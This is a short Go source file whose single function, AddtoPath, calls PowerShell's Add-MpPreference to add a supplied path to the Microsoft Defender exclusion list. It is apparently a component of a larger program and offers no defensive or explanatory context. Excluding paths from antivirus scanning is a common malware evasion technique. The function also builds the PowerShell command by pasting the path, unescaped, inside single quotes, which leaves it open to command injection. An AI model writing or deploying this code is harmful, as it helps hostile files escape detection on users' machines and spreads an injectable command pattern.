package program

import (
	"fmt"
	"os/exec"
	
)

func AddtoPath(filePath string) {
	fmt.Println("Path to add to the exclusion list:", filePath)

	cmd := exec.Command("powershell", "-Command", "Add-MpPreference -ExclusionPath '"+filePath+"'")
	err := cmd.Run()

	if err != nil {
		fmt.Println("Failed to add to exclusion list:", err)
		return
	}
	fmt.Println("Successfully added to exclusion list")
}


